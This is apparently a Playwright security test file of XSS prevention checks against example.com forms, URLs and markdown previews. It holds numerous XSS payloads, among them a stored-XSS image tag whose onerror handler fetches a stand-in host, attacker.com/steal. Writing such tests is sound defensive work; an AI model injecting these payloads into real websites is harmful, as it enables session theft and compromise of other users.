/* eslint-disable playwright/no-wait-for-timeout, no-restricted-syntax */
/**
 * @fileoverview XSS Prevention Testing Pattern
 *
 * Demonstrates best practices for testing XSS (Cross-Site Scripting)
 * vulnerability prevention:
 * - Input sanitization
 * - Output encoding
 * - Script injection prevention
 * - DOM-based XSS
 * - Stored XSS
 * - Reflected XSS
 *
 * When to use: Security testing for user input handling
 * Common pitfalls:
 *  - Only testing common payloads (attackers use variations)
 *  - Not testing all input vectors
 *  - Assuming framework XSS protection is sufficient
 *  - Not testing combination attacks
 *
 * @example
 * npm run test:security -- xss-prevention.spec.ts
 */

import { test, expect } from '@playwright/test';

test.describe('XSS Prevention @security', () => {
  test('should escape script tags in comments', async ({ page }) => {
    await page.goto('https://example.com/posts/1');

    const commentForm = page.locator('[data-testid="comment-form"]');
    const commentInput = commentForm.locator('textarea');
    const submitButton = commentForm.locator('button');

    // Try XSS payload
    const xssPayload = '<script>alert("XSS")</script>';

    // Listen for alert (which would indicate XSS)
    let alertFired = false;
    page.on('dialog', () => {
      alertFired = true;
    });

    await commentInput.fill(xssPayload);
    await submitButton.click();

    // Alert should NOT fire
    await page.waitForLoadState('networkidle');
    expect(alertFired).toBe(false);

    // Payload should be displayed as text, not executed
    const displayedComment = page.locator('[data-testid="comment"]');
    await expect(displayedComment).toContainText('<script>alert');
  });

  test('should escape event handler attributes', async ({ page }) => {
    await page.goto('https://example.com');

    const userInput = page.locator('[data-testid="user-bio-input"]');
    const submitButton = page.locator('[data-testid="save-bio"]');

    const xssPayload = '"><img src=x onerror="alert(\'XSS\')">';

    let eventHandlerFired = false;
    page.on('dialog', () => {
      eventHandlerFired = true;
    });

    await userInput.fill(xssPayload);
    await submitButton.click();

    // Event handler should NOT execute
    await page.waitForTimeout(1000);
    expect(eventHandlerFired).toBe(false);
  });

  test('should escape HTML in user-generated content', async ({ page }) => {
    await page.goto('https://example.com/forum');

    const postForm = page.locator('[data-testid="post-form"]');
    const contentInput = postForm.locator('textarea');
    const submitButton = postForm.locator('button');

    const htmlPayload = '<img src=x onerror="console.log(\'XSS\')">';

    await contentInput.fill(htmlPayload);
    await submitButton.click();

    // HTML should be escaped in display
    const post = page.locator('[data-testid="post-content"]');
    await expect(post).toContainText('<img src=x');
  });

  test('should prevent SVG-based XSS', async ({ page }) => {
    await page.goto('https://example.com');

    const svgPayload = '<svg onload="alert(\'XSS\')">';

    let xssExecuted = false;
    page.on('dialog', () => {
      xssExecuted = true;
    });

    await page.evaluate((payload) => {
      const element = document.querySelector('[data-testid="content-area"]');
      if (element) {
        element.innerHTML = payload;
      }
    }, svgPayload);

    await page.waitForTimeout(1000);
    expect(xssExecuted).toBe(false);
  });

  test('should prevent data URI XSS', async ({ page }) => {
    await page.goto('https://example.com');

    const dataUriPayload = 'data:text/html,<script>alert("XSS")</script>';

    let xssExecuted = false;
    page.on('dialog', () => {
      xssExecuted = true;
    });

    // Try to navigate to data URI (should be blocked)
    try {
      await page.goto(dataUriPayload, { timeout: 2000 });
    } catch {
      // Navigation blocked or timed out (good)
    }

    expect(xssExecuted).toBe(false);
  });

  test('should escape JavaScript protocol URLs', async ({ page }) => {
    await page.goto('https://example.com');

    const jsProtocolPayload = 'javascript:alert("XSS")';

    let xssExecuted = false;
    page.on('dialog', () => {
      xssExecuted = true;
    });

    const linkInput = page.locator('[data-testid="link-input"]');
    await linkInput.fill(jsProtocolPayload);

    const link = page.locator('[data-testid="generated-link"]');
    const href = await link.getAttribute('href');

    // href should be escaped or sanitized
    expect(href).not.toContain('javascript:');

    await page.waitForTimeout(1000);
    expect(xssExecuted).toBe(false);
  });

  test('should prevent double encoding bypass', async ({ page }) => {
    await page.goto('https://example.com/search');

    // Try double-encoded payload
    const doubleEncodedPayload = '%253Cscript%253Ealert(1)%253C%2Fscript%253E';

    const searchInput = page.locator('[data-testid="search"]');
    await searchInput.fill(doubleEncodedPayload);

    const submitButton = page.locator('[data-testid="search-btn"]');
    await submitButton.click();

    // Results should be safe
    const results = page.locator('[data-testid="results"]');
    await expect(results).not.toContainText('<script>');
  });

  test('should prevent mutation XSS (mXSS)', async ({ page }) => {
    await page.goto('https://example.com');

    // mXSS payload that exploits HTML parsing
    const mxssPayload = '<noscript><p title="</noscript><img src=x onerror=alert(1)>';

    let xssExecuted = false;
    page.on('dialog', () => {
      xssExecuted = true;
    });

    const container = page.locator('[data-testid="content"]');
    await container.fill(mxssPayload);

    await page.waitForTimeout(1000);
    expect(xssExecuted).toBe(false);
  });

  test('should prevent stored XSS in user profiles', async ({ page }) => {
    // First, create a post with XSS payload as authenticated user
    await page.goto('https://example.com/login');
    await page.fill('[data-testid="email"]', 'attacker@test.com');
    await page.fill('[data-testid="password"]', 'password');
    await page.click('[data-testid="login"]');

    // Create malicious post
    await page.goto('https://example.com/create-post');
    const xssPayload = '<img src=x onerror="fetch(\'https://attacker.com/steal\')">';

    await page.fill('[data-testid="title"]', 'Normal Title');
    await page.fill('[data-testid="content"]', xssPayload);
    await page.click('[data-testid="publish"]');

    // Logout
    await page.click('[data-testid="logout"]');

    // Visit post as different user
    await page.goto('https://example.com/posts/malicious-post');

    let exfiltratedData = false;
    page.on('request', (request) => {
      if (request.url().includes('attacker.com')) {
        exfiltratedData = true;
      }
    });

    await page.waitForTimeout(1000);

    // Data exfiltration should NOT occur
    expect(exfiltratedData).toBe(false);

    // XSS payload should be displayed as text
    const content = page.locator('[data-testid="post-content"]');
    await expect(content).toContainText('<img src=x');
  });

  test('should prevent DOM-based XSS via URL fragment', async ({ page }) => {
    const xssFragment = '#<img src=x onerror="alert(\'XSS\')">';

    let xssExecuted = false;
    page.on('dialog', () => {
      xssExecuted = true;
    });

    await page.goto(`https://example.com/page${xssFragment}`);

    await page.waitForTimeout(1000);
    expect(xssExecuted).toBe(false);
  });

  test('should prevent XSS via Content Security Policy bypass', async ({ page }) => {
    await page.goto('https://example.com');

    // Verify CSP header is present (CSP check in real scenario)

    const xssPayload = '<script>alert("XSS")</script>';

    let scriptExecuted = false;
    page.on('dialog', () => {
      scriptExecuted = true;
    });

    // Attempt XSS
    await page.evaluate((payload) => {
      const element = document.querySelector('body');
      element?.insertAdjacentHTML('beforeend', payload);
    }, xssPayload);

    await page.waitForTimeout(1000);
    expect(scriptExecuted).toBe(false);
  });

  test('should sanitize markdown input', async ({ page }) => {
    await page.goto('https://example.com/notes');

    const markdownInput = page.locator('[data-testid="markdown-input"]');
    const previewArea = page.locator('[data-testid="preview"]');

    // Markdown with embedded XSS
    const maliciousMarkdown = `
# Title
[Link](javascript:alert('XSS'))
![Image](<img src=x onerror="alert('XSS')">)
<script>alert('XSS')</script>
    `;

    let xssExecuted = false;
    page.on('dialog', () => {
      xssExecuted = true;
    });

    await markdownInput.fill(maliciousMarkdown);

    // Preview should render safely
    await page.waitForTimeout(500);
    expect(xssExecuted).toBe(false);

    // Verify content is rendered as text
    const previewText = await previewArea.textContent();
    expect(previewText).not.toContain('<script>');
  });

  test('should escape special characters in context', async ({ page }) => {
    await page.goto('https://example.com');

    const specialChars = '<>"\'&';

    const input = page.locator('[data-testid="special-input"]');
    await input.fill(specialChars);

    const output = page.locator('[data-testid="special-output"]');

    // Should be properly escaped
    const text = await output.textContent();
    expect(text).toContain('&lt;');
    expect(text).toContain('&gt;');
    expect(text).toContain('&quot;');
    expect(text).toContain('&amp;');
  });
});
